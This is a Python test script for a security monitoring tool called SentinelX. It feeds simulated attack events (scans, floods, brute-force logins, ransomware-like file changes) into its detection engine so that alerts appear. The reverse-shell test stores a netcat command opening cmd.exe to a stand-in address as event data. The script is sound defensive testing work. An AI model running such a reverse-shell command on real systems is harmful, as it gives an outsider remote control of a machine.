
"""
SentinelX – Test Simulation Script
Safely generates fake events to verify each detection module is working.
Run this WHILE the SentinelX GUI is open to see alerts appear in real time.

Usage:
    python test_simulation.py
"""

import sys
import os
import time
import tempfile
import shutil

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from sentinelx.core.engine import DetectionEngine, Event
from sentinelx.database.db_manager import DatabaseManager


def banner(text: str) -> None:
    print(f"\n{'='*60}")
    print(f"  {text}")
    print(f"{'='*60}")


def test_port_scan_alert():
    """Simulate a port scan: one IP hitting 20 different ports."""
    banner("TEST 1: Port Scan Detection")
    engine = DetectionEngine()

    attacker_ip = "198.51.100.77"
    target_ip = "10.0.0.25"
    print(f"  Simulating {attacker_ip} scanning 20 ports on {target_ip}...")

    for port in range(20, 40):
        engine.submit_event(Event(
            event_type="same_ip_multiple_ports",
            source=attacker_ip,
            destination=target_ip,
            details={"destination_port": port, "unique_ports": port - 19},
        ))
    print("  -> Check Dashboard for 'Port Scan Detected' alert")
    time.sleep(1)


def test_syn_flood_alert():
    """Simulate a SYN flood: sustained high SYN packet rate from one IP.
    Phase 1 (sec 1-3): 60 SYN/s — exceeds initial threshold (50/s) → alert
    Phase 2 (sec 4-7): 25 SYN/s — adaptive decay catches sustained attack
    """
    banner("TEST 2: SYN Flood Detection (Rate-Based, Adaptive Threshold)")
    engine = DetectionEngine()

    attacker_ip = "203.0.113.200"
    target_ip = "10.0.0.1"

    # Phase 1: High burst — 60 SYN/s for 3 seconds
    print(f"  Phase 1: {attacker_ip} → {target_ip} at 60 SYN/s (3 seconds)...")
    for sec in range(3):
        for i in range(60):
            engine.submit_event(Event(
                event_type="syn_flood",
                source=attacker_ip,
                destination=target_ip,
                details={"syn_count": sec * 60 + i + 1},
            ))
        time.sleep(1)

    # Phase 2: Sustained lower rate — 25 SYN/s for 4 seconds
    print(f"  Phase 2: {attacker_ip} → {target_ip} at 25 SYN/s (4 seconds, testing decay)...")
    for sec in range(4):
        for i in range(25):
            engine.submit_event(Event(
                event_type="syn_flood",
                source=attacker_ip,
                destination=target_ip,
                details={"syn_count": 180 + sec * 25 + i + 1},
            ))
        time.sleep(1)

    print("  → Check SOC Alerts for 'SYN Flood Detected' (Windows toast + SOC popup)")
    time.sleep(1)


def test_brute_force_alert():
    """Simulate brute force: 10 failed logins from same IP."""
    banner("TEST 3: Brute Force Login Detection")
    engine = DetectionEngine()

    attacker_ip = "185.220.101.42"
    target_ip = "10.0.0.5"
    print(f"  Simulating 10 failed logins from {attacker_ip} to {target_ip}...")

    for i in range(10):
        engine.submit_event(Event(
            event_type="failed_logins",
            source=attacker_ip,
            destination=target_ip,
            details={"event_id": 4625, "description": f"Failed login attempt #{i+1}"},
        ))
    print("  -> Check Dashboard for 'Brute Force Login Attempt' alert")
    time.sleep(1)


def test_suspicious_process():
    """Simulate a suspicious process chain."""
    banner("TEST 4: Suspicious Process Chain Detection")
    engine = DetectionEngine()

    attacker_ip = "10.0.0.15"
    target_ip = "10.0.0.5"
    print(f"  Simulating svchost.exe -> powershell.exe chain from {attacker_ip}...")
    engine.submit_event(Event(
        event_type="suspicious_process_chain",
        source=attacker_ip,
        destination=target_ip,
        details={
            "parent": "svchost.exe",
            "child": "powershell.exe",
            "pid": 9999,
        },
    ))
    print("  -> Check Dashboard for 'Suspicious Process Chain' alert")
    time.sleep(1)


def test_reverse_shell():
    """Simulate a reverse shell pattern."""
    banner("TEST 5: Reverse Shell Detection")
    engine = DetectionEngine()

    attacker_ip = "10.0.0.15"
    c2_ip = "198.51.100.99"
    print(f"  Simulating reverse shell from {attacker_ip} to {c2_ip}...")
    engine.submit_event(Event(
        event_type="reverse_shell",
        source=attacker_ip,
        destination=c2_ip,
        details={
            "command": "nc.exe -e cmd.exe 198.51.100.99 4444",
            "pid": 8888,
        },
    ))
    print("  -> Check Dashboard for 'Reverse Shell Pattern' alert (Critical)")
    time.sleep(1)


def test_file_integrity():
    """Simulate file modification events."""
    banner("TEST 6: File Integrity Alert")
    engine = DetectionEngine()

    attacker_ip = "172.16.0.88"
    target_ip = "10.0.0.5"
    print(f"  Simulating protected file modification from {attacker_ip}...")
    engine.submit_event(Event(
        event_type="file_modified",
        source=attacker_ip,
        destination=target_ip,
        details={"old_hash": "abc123", "new_hash": "def456", "file_path": "C:\\Windows\\System32\\drivers\\etc\\hosts"},
    ))

    engine.submit_event(Event(
        event_type="file_deleted",
        source=attacker_ip,
        destination=target_ip,
        details={"file_path": "C:\\important\\config.ini"},
    ))
    print("  -> Check Dashboard for 'Protected File Modified/Deleted' alerts")
    time.sleep(1)


def test_ransomware_simulation():
    """Simulate ransomware-like mass file changes."""
    banner("TEST 7: Ransomware Behavior Detection")
    engine = DetectionEngine()

    attacker_ip = "192.168.1.200"
    target_ip = "10.0.0.5"
    print(f"  Simulating 60 rapid file modifications from {attacker_ip} (ransomware pattern)...")
    for i in range(60):
        engine.submit_event(Event(
            event_type="mass_file_modification",
            source=attacker_ip,
            destination=target_ip,
            details={"modifications": i + 1, "file_path": f"C:\\Users\\victim\\Documents\\file_{i}.docx"},
        ))
    print("  -> Check Dashboard for 'Ransomware Behavior Detected' alert (Critical)")
    time.sleep(1)


def test_dos_attack():
    """Simulate a DoS attack: sustained high request rate from one IP.
    Phase 1 (sec 1-3): 120 req/s — exceeds initial threshold (100/s) → alert
    Phase 2 (sec 4-8): 40 req/s — initially below base threshold but
                        adaptive decay lowers threshold → alert at ~sec 6-7
    Demonstrates the adaptive threshold decay over sustained traffic.
    """
    banner("TEST 8: DoS Attack Detection (Rate-Based, Adaptive Threshold)")
    engine = DetectionEngine()

    attacker_ip = "45.33.32.156"
    target_ip = "10.0.0.1"

    # Phase 1: High burst — 120 req/s for 3 seconds
    print(f"  Phase 1: {attacker_ip} → {target_ip} at 120 req/s (3 seconds)...")
    for sec in range(3):
        for i in range(120):
            engine.submit_event(Event(
                event_type="dos_flood",
                source=attacker_ip,
                destination=target_ip,
                details={"request_count": sec * 120 + i + 1, "protocol": "TCP"},
            ))
        time.sleep(1)

    # Phase 2: Sustained medium rate — 60 req/s for 5 seconds
    # Below the base 100/s threshold but adaptive decay catches it:
    # At ~6s elapsed, threshold decays from 100 → ~53 → 60 exceeds it → alert!
    print(f"  Phase 2: {attacker_ip} → {target_ip} at 60 req/s (5 seconds, testing decay)...")
    for sec in range(5):
        for i in range(60):
            engine.submit_event(Event(
                event_type="dos_flood",
                source=attacker_ip,
                destination=target_ip,
                details={"request_count": 360 + sec * 60 + i + 1, "protocol": "TCP"},
            ))
        time.sleep(1)

    print("  → Check SOC Alerts for 'DoS Attack Detected' (adaptive threshold)")
    time.sleep(1)


def test_http_flood():
    """Simulate an HTTP flood: sustained HTTP request rate from one IP.
    Phase 1 (sec 1-3): 60 req/s — exceeds initial threshold (50/s) → alert
    Phase 2 (sec 4-7): 20 req/s — adaptive decay catches the sustained attack
    """
    banner("TEST 9: HTTP Flood Detection (Rate-Based, Adaptive Threshold)")
    engine = DetectionEngine()

    attacker_ip = "91.189.114.50"
    target_ip = "10.0.0.1"

    # Phase 1: High burst — 60 req/s for 3 seconds
    print(f"  Phase 1: {attacker_ip} → {target_ip} at 60 HTTP req/s (3 seconds)...")
    for sec in range(3):
        for i in range(60):
            engine.submit_event(Event(
                event_type="http_flood",
                source=attacker_ip,
                destination=target_ip,
                details={"request_count": sec * 60 + i + 1, "method": "GET", "uri": "/"},
            ))
        time.sleep(1)

    # Phase 2: Lower sustained rate — 30 req/s for 5 seconds
    # Below the base 50/s threshold but adaptive decay catches it:
    # At ~6s elapsed, threshold decays from 50 → ~29 → 30 exceeds it → alert!
    print(f"  Phase 2: {attacker_ip} → {target_ip} at 30 HTTP req/s (5 seconds, testing decay)...")
    for sec in range(5):
        for i in range(30):
            engine.submit_event(Event(
                event_type="http_flood",
                source=attacker_ip,
                destination=target_ip,
                details={"request_count": 180 + sec * 30 + i + 1, "method": "GET", "uri": "/api/login"},
            ))
        time.sleep(1)

    print("  → Check SOC Alerts for 'HTTP Flood Detected' (adaptive threshold)")
    time.sleep(1)


def test_suspicious_outbound():
    """Simulate suspicious outbound connections."""
    banner("TEST 10: Suspicious Outbound Connection")
    engine = DetectionEngine()

    source_ip = "192.168.1.100"
    print(f"  Simulating {source_ip} connecting to malicious port 4444...")
    for i in range(5):
        engine.submit_event(Event(
            event_type="suspicious_outbound",
            source=source_ip,
            destination=f"198.51.100.{50 + i}",
            details={"destination_port": 4444},
        ))
    print("  -> Check Dashboard for 'Suspicious Outbound Connection' alert")
    time.sleep(1)


def show_summary():
    """Show what ended up in the database."""
    banner("RESULTS SUMMARY")
    db = DatabaseManager()
    stats = db.get_alert_stats(hours=1)
    print(f"  Total Alerts:  {stats.get('total', 0)}")
    print(f"  Critical:      {stats.get('critical', 0)}")
    print(f"  High:          {stats.get('high', 0)}")
    print(f"  Medium:        {stats.get('medium', 0)}")
    print(f"  Low:           {stats.get('low', 0)}")
    print()

    top_ips = stats.get("top_ips", [])
    if top_ips:
        print("  Top Suspicious Sources:")
        for ip in top_ips[:5]:
            print(f"    {ip['ip']:30s}  ({ip['count']} alerts)")
    print()
    print("  Open the SentinelX Dashboard to see all alerts visually!")
    print("  Check Alerts tab -> filter by severity to explore each one.")
    print("  Check Threat Explorer -> click an alert for full details.")


def main():
    auto = "--auto" in sys.argv
    print("""
    ╔══════════════════════════════════════════════════════════╗
    ║          SentinelX – Threat Simulation Script           ║
    ║                                                         ║
    ║  This script injects FAKE events into the detection     ║
    ║  engine to verify all alert types are working.          ║
    ║                                                         ║
    ║  ⚠  No real attacks are performed!                      ║
    ║  ⚠  Run this while the SentinelX GUI is open.          ║
    ╚══════════════════════════════════════════════════════════╝
    """)

    if not auto:
        input("  Press ENTER to start the simulation...\n")

    # Start the rate monitor so DoS/flood per-second detection works
    engine = DetectionEngine()
    engine.start_rate_monitor()

    test_port_scan_alert()
    test_syn_flood_alert()
    test_brute_force_alert()
    test_suspicious_process()
    test_reverse_shell()
    test_file_integrity()
    test_ransomware_simulation()
    test_dos_attack()
    test_http_flood()
    test_suspicious_outbound()

    show_summary()


if __name__ == "__main__":
    main()
